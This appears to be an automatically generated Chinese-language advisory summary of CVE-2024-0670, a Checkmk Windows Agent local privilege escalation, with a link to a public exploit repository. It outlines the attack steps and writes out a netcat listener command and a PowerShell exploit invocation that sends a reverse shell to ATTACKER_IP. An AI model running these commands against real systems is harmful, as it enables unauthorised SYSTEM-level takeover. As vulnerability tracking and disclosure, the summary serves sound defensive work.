## CVE-2024-0670 - Checkmk Agent 本地提权

**漏洞编号:** CVE-2024-0670

**漏洞类型:** 本地权限提升

**影响应用:** Checkmk Agent

**危害等级:** 高危，本地用户可获取 SYSTEM 权限

**影响版本:** < 2.2.0p23, < 2.1.0p40, <= 2.0.0p39

**利用条件:** 低权限的Windows账户，允许执行 Powershell，能够从攻击者主机下载文件，已安装存在漏洞的 Checkmk Windows Agent

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-0670 是 Checkmk Agent Windows 版本中的一个本地权限提升漏洞。攻击者（本地低权限用户）可以利用该漏洞通过 MSI 修复机制执行任意代码，从而获得 SYSTEM 权限。

**漏洞利用方式：**

1.  **准备攻击环境：**
    *   攻击者需要准备一个 HTTP 服务器，用于托管攻击所需的工具（`RunasCs.exe`，`nc.exe`，`exploit.ps1`）。
    *   攻击者需要监听一个端口，用于接收反弹 shell（例如：`nc -lvnp 1111`）。

2.  **在目标机器上下载工具：**
    *   攻击者使用 PowerShell 从攻击者搭建的 HTTP 服务器下载 `RunasCs.exe`，`nc.exe`，`exploit.ps1` 到 `C:\Windows\Temp\` 目录。

3.  **执行漏洞利用脚本：**
    *   攻击者使用 PowerShell 执行 `exploit.ps1` 脚本（例如：`powershell.exe -ExecutionPolicy Bypass -File C:\Windows\Temp\exploit.ps1 -MinPID 1000 -MaxPID 10000 -LHOST ATTACKER_IP -LPORT 1111`）。`exploit.ps1` 脚本会检测 Checkmk MSI 包，创建大量的批处理文件，并在批处理文件中写入反弹 shell 的 Payload，然后触发 MSI 修复，迫使以 SYSTEM 权限执行批处理文件，从而获得 SYSTEM 权限的反弹 shell。

**有效性：**

根据漏洞描述和提供的漏洞利用代码，该漏洞利用代码是有效的。它利用了 Checkmk Agent 在 Windows 上的一个权限提升漏洞，该漏洞允许低权限用户通过 MSI 修复机制获得 SYSTEM 权限。

**投毒风险：**

该仓库中存在一定投毒风险。虽然主要功能是权限提升，但是`RunasCs.cs`的功能是使用明文密码来运行程序，如果攻击者修改该代码，可能会导致密码泄露。此外，提供的`exploit.ps1`脚本内容复杂，可能存在未知的恶意行为。因此，投毒风险评估为10%。用户在使用前需要仔细审查代码，确保其安全性。

**项目地址:** [elsevar11/CVE-2024-0670---CheckMK-Agent-Local-Privilege-Escalation-Exploit](https://github.com/elsevar11/CVE-2024-0670---CheckMK-Agent-Local-Privilege-Escalation-Exploit)

**漏洞详情:** [CVE-2024-0670](https://nvd.nist.gov/vuln/detail/CVE-2024-0670)